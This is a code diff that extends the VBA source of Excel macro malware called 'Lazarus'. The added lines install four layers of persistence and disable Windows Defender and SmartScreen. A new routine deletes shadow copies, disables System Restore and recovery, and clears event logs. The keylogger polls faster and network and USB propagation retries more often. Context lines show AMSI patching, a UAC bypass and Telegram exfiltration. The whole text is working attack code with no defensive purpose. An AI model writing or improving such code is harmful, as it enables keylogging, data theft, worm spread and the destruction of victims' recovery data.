@@ -140,7 +140,6 @@ Private g_emailTargets As Object
 ' Propagation retry flags
 Private g_usbPropagated As Boolean
 Private g_smbPropagated As Boolean
-Private g_retryCount As Integer
 
 ' ========================
 ' ERROR HANDLING UTILITIES
@@ -220,10 +219,11 @@ Private Function CurToUlongLong(cur As Currency) As LongLong
 End Function
 
 ' ========================
-' PERSISTENT LAUNCHER (VBS) – RESTARTS EXCEL IF CLOSED
+' AGGRESSIVE PERSISTENCE (LAYERED WATCHDOG)
 ' ========================
 Sub InstallPersistentLauncher()
     On Error Resume Next
+    ' 1. VBS launcher in Startup
     Dim vbsPath As String: vbsPath = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\LazarusLauncher.vbs"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim f As Object: Set f = fso.CreateTextFile(vbsPath, True)
@@ -234,8 +234,21 @@ Sub InstallPersistentLauncher()
     f.WriteLine "objExcel.Visible = False"
     f.Close
     SetAttr vbsPath, vbHidden + vbSystem
+    
+    ' 2. Registry Run key
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\LazarusLauncher", "wscript.exe """ & vbsPath & """", "REG_SZ"
+    
+    ' 3. Scheduled task (runs every 5 minutes)
+    Dim xml As String
+    xml = "<?xml version=""1.0"" encoding=""UTF-16""?><Task version=""1.4""><Triggers><CalendarTrigger><Repetition><Interval>PT5M</Interval></Repetition><StartBoundary>2025-01-01T00:00:00</StartBoundary></CalendarTrigger></Triggers><Actions><Exec><Command>wscript.exe</Command><Arguments>""" & vbsPath & """</Arguments></Exec></Actions></Task>"
+    Dim tmp As String: tmp = GetTempDir() & "task.xml"
+    Dim ftmp As Object: Set ftmp = fso.CreateTextFile(tmp, True): ftmp.Write xml: ftmp.Close
+    wsh.Run "schtasks /create /tn ""LazarusWatchdog"" /xml """ & tmp & """ /f", 0, True
+    fso.DeleteFile tmp
+    
+    ' 4. Logon script (HKCU\Environment)
+    wsh.RegWrite "HKCU\Environment\LazarusStart", "wscript.exe """ & vbsPath & """", "REG_SZ"
 End Sub
 
 ' ========================
@@ -353,7 +366,7 @@ Sub SendToTelegramChunked(msg As String)
 End Sub
 
 ' ========================
-' POLLING KEYLOGGER (PUBLIC)
+' POLLING KEYLOGGER (FASTER POLLING – 20ms)
 ' ========================
 Public Sub PollingKeylogger()
     On Error Resume Next
@@ -381,7 +394,8 @@ Public Sub PollingKeylogger()
             lastKeys(i) = 0
         End If
     Next i
-    Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
+    ' Schedule next run in 20ms (faster polling)
+    Application.OnTime Now + TimeValue("00:00:00.02"), "PollingKeylogger"
 End Sub
 
 Function GetKeyName(vKey As Integer) As String
@@ -540,13 +554,38 @@ Sub DisableDefender()
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD"
+    wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet\SpyNetReporting", 0, "REG_DWORD"
+    wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet\SubmitSamplesConsent", 0, "REG_DWORD"
+    ' Delete Defender signatures (if possible)
+    wsh.Run "MpCmdRun.exe -RemoveDefinitions -All >nul 2>&1", 0, True
+    ' PowerShell exclusions
     On Error Resume Next
     wsh.Run "powershell -c ""Add-MpPreference -ExclusionPath '" & gSelfPath & "'"" >nul 2>&1", 0, True
     wsh.Run "powershell -c ""Add-MpPreference -ExclusionProcess '" & Application.Name & "'"" >nul 2>&1", 0, True
+    ' Disable SmartScreen
+    wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows\System\EnableSmartScreen", 0, "REG_DWORD"
+    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost\EnableWebContentEvaluation", 0, "REG_DWORD"
+End Sub
+
+Sub DisableRecovery()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    ' Delete all shadow copies
+    wsh.Run "vssadmin delete shadows /all /quiet >nul 2>&1", 0, True
+    ' Disable System Restore
+    wsh.Run "powershell -c ""Disable-ComputerRestore -Drive 'C:\'"" >nul 2>&1", 0, True
+    ' Disable Windows RE
+    wsh.Run "reagentc /disable >nul 2>&1", 0, True
+    ' Clear event logs
+    wsh.Run "wevtutil cl System >nul 2>&1", 0, True
+    wsh.Run "wevtutil cl Application >nul 2>&1", 0, True
+    wsh.Run "wevtutil cl Security >nul 2>&1", 0, True
+    ' Disable Windows Error Reporting
+    wsh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Disabled", 1, "REG_DWORD"
 End Sub
 
 ' ========================
-' PRIVILEGE ESCALATION – MULTIPLE FALLBACKS
+' PRIVILEGE ESCALATION – MULTIPLE FALLBACKS (INCLUDING SCHTASKS SYSTEM)
 ' ========================
 Sub UACBypass_Fodhelper()
     On Error Resume Next
@@ -1517,7 +1556,6 @@ Private Function IsPortOpen(ip As String, port As Integer) As Boolean
     On Error Resume Next
     Set sock = CreateObject("MSWinsock.Winsock")
     If sock Is Nothing Then
-        ' Fallback: use simple TCP socket via WinHttp? Not possible. Skip port scanning.
         IsPortOpen = False
         Exit Function
     End If
@@ -1609,7 +1647,7 @@ Sub SMBPropagation()
 End Sub
 
 ' ========================
-' RETRY MECHANISM – SCHEDULED EVERY 30 MINUTES
+' RETRY MECHANISM – SCHEDULED EVERY 15 MINUTES
 ' ========================
 Public Sub RetryPropagation()
     On Error Resume Next
@@ -1619,9 +1657,9 @@ Public Sub RetryPropagation()
     If Not g_smbPropagated Then
         SMBPropagation
     End If
-    ' Schedule again after 30 minutes if not both succeeded
+    ' Schedule again after 15 minutes if not both succeeded
     If (Not g_usbPropagated) Or (Not g_smbPropagated) Then
-        Application.OnTime Now + TimeValue("00:30:00"), "RetryPropagation"
+        Application.OnTime Now + TimeValue("00:15:00"), "RetryPropagation"
     End If
 End Sub
 
@@ -1773,14 +1811,24 @@ Sub PersistAll()
 End Sub
 
 ' ========================
-' WATCHDOG – KEEPS MALWARE ALIVE
+' WATCHDOG – KEEPS MALWARE ALIVE (MULTI‑LAYER)
 ' ========================
 Public Sub Watchdog()
     If gWatchdogActive Then Exit Sub
     gWatchdogActive = True
     On Error Resume Next
+    ' 1. VBS launcher (already in Startup)
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.Run "wscript.exe """ & Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\LazarusLauncher.vbs""", 0, False
+    ' 2. Scheduled task (already created)
+    ' 3. Registry Run (already added)
+    ' 4. If Excel is not running, restart it
+    Dim objWMIService As Object: Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Dim colProcesses As Object: Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'excel.exe'")
+    If colProcesses.Count = 0 Then
+        wsh.Run "excel.exe """ & gSelfPath & """", 0, False
+    End If
+    ' Schedule next check every minute
     Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
 End Sub
 
@@ -1811,12 +1859,13 @@ Public Sub AutoExec()
     PatchAMSI
     KillETW
     DisableDefender
+    DisableRecovery
     ElevatePrivileges
     GenerateMasterKey
     SendToTelegram "LAZARUS_START|" & GetMachineID()
     
     PersistAll
-    Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
+    Application.OnTime Now + TimeValue("00:00:00.02"), "PollingKeylogger"   ' 20ms polling
     Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
     
     If IsDomainController() Then
@@ -1841,8 +1890,8 @@ Public Sub AutoExec()
         DeploySocialEngineeringUI
         Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
         
-        ' Start retry mechanism for propagation
-        Application.OnTime Now + TimeValue("00:30:00"), "RetryPropagation"
+        ' Start retry mechanism for propagation (every 15 minutes)
+        Application.OnTime Now + TimeValue("00:15:00"), "RetryPropagation"
     End If
     
     Application.Visible = False
